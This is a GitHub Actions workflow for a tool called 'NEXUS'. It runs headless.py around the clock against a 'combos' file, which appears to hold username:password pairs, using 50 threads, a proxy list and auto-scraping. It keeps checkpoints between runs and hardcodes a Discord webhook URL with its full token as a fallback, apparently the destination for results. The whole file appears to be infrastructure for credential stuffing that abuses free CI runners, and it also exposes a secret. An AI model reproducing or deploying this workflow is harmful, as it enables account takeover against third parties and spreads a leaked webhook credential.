name: NEXUS Cloud State Validator (24/7 Headless)

on:
  workflow_dispatch:
    inputs:
      threads:
        description: 'Concurrency / Worker Threads'
        required: false
        default: '50'
      combos_file:
        description: 'Path to combos file inside repo'
        required: false
        default: 'combos.txt'
      resume:
        description: 'Resume from last checkpoint.json'
        type: boolean
        required: false
        default: true
  schedule:
    # Every 6 hours — continuous 24/7 execution chain
    - cron: '0 */6 * * *'

jobs:
  validate:
    runs-on: ubuntu-latest
    name: Execute Platform Authentication Probes
    timeout-minutes: 350

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Setup Python 3.11
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'
          cache: 'pip'

      - name: Install Headless Dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements-headless.txt

      # ── Checkpoint Persistence ────────────────────────────────────────────────
      # Download the latest checkpoint artifact from the most recently completed
      # run so progress is never lost across separate GitHub Actions workflow runs.
      - name: Download Latest Checkpoint Artifact
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          mkdir -p results
          # Find the most recent successful workflow run (excluding current)
          LATEST_RUN=$(gh api \
            "repos/${{ github.repository }}/actions/runs?status=success&per_page=5" \
            --jq '[.workflow_runs[] | select(.id != ${{ github.run_id }})][0].id' \
            2>/dev/null || echo "")
          
          if [ -n "$LATEST_RUN" ] && [ "$LATEST_RUN" != "null" ]; then
            echo "Found previous run: $LATEST_RUN — downloading checkpoint..."
            ARTIFACT_ID=$(gh api \
              "repos/${{ github.repository }}/actions/runs/${LATEST_RUN}/artifacts" \
              --jq '.artifacts[] | select(.name | startswith("nexus-validation-results")) | .id' \
              2>/dev/null | head -1)
            
            if [ -n "$ARTIFACT_ID" ]; then
              gh api \
                "repos/${{ github.repository }}/actions/artifacts/${ARTIFACT_ID}/zip" \
                -H "Accept: application/vnd.github+json" \
                > artifact.zip 2>/dev/null && \
              unzip -o artifact.zip -d checkpoint_restore && \
              cp -r checkpoint_restore/results/. results/ 2>/dev/null && \
              echo "✅ Checkpoint restored from artifact $ARTIFACT_ID" || \
              echo "⚠️ Artifact restore failed — starting fresh"
              rm -f artifact.zip
            else
              echo "No checkpoint artifact found — starting fresh"
            fi
          else
            echo "No previous run found — starting fresh"
          fi
          
          # Show restored checkpoint status
          if [ -f results/checkpoint.json ]; then
            echo "=== Restored Checkpoint ==="
            cat results/checkpoint.json
          fi

      # ── Main Execution Loop ───────────────────────────────────────────────────
      - name: Run NEXUS Headless Cloud Runner
        env:
          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
          PYTHONUNBUFFERED: "1"
          PYTHONIOENCODING: "utf-8"
        run: |
          if [ -z "$DISCORD_WEBHOOK_URL" ]; then
            export DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1548283725819674714/ScoIrZpwklucgiwb-oq4UrDvGLmqG62qeSXYjZe1q0Fb1QP-j1tFDbLUmFCfHrtjlpxb"
          fi
          
          COMBO_FILE="${{ github.event.inputs.combos_file || 'combos.txt' }}"
          THREADS="${{ github.event.inputs.threads || '50' }}"
          
          echo "=== NEXUS Continuous Cloud Runner starting ==="
          echo "Combo file: ${COMBO_FILE}"
          echo "Threads: ${THREADS}"
          
          START_TIME=$(date +%s)
          MAX_RUNTIME=19800   # 5.5 hours — leave buffer for artifact upload
          CYCLE=0
          
          while true; do
            NOW=$(date +%s)
            ELAPSED=$((NOW - START_TIME))
            if [ $ELAPSED -ge $MAX_RUNTIME ]; then
              echo "=== Reaching maximum runner window (${ELAPSED}s). Exiting gracefully... ==="
              break
            fi
            
            REMAINING=$((MAX_RUNTIME - ELAPSED))
            CYCLE=$((CYCLE + 1))
            echo ""
            echo "--- Cycle #${CYCLE} | Elapsed: ${ELAPSED}s | Remaining: ${REMAINING}s ---"
            
            # Always resume from checkpoint on restart
            timeout "${REMAINING}" python headless.py \
              --combos "${COMBO_FILE}" \
              --threads "${THREADS}" \
              --auto-scrape \
              --resume || true
              
            CYCLE_EXIT=$?
            echo "Cycle #${CYCLE} ended (exit: ${CYCLE_EXIT}). Checkpoint:"
            [ -f results/checkpoint.json ] && cat results/checkpoint.json || echo "No checkpoint yet"
            echo "Sleeping 3 seconds before next cycle..."
            sleep 3
          done
          
          echo ""
          echo "=== NEXUS run complete. Final checkpoint ==="
          [ -f results/checkpoint.json ] && cat results/checkpoint.json

      # ── Always upload results ─────────────────────────────────────────────────
      - name: Upload Results Artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: nexus-validation-results-${{ github.run_id }}
          path: |
            results/
            proxies.txt
          retention-days: 30
          if-no-files-found: warn
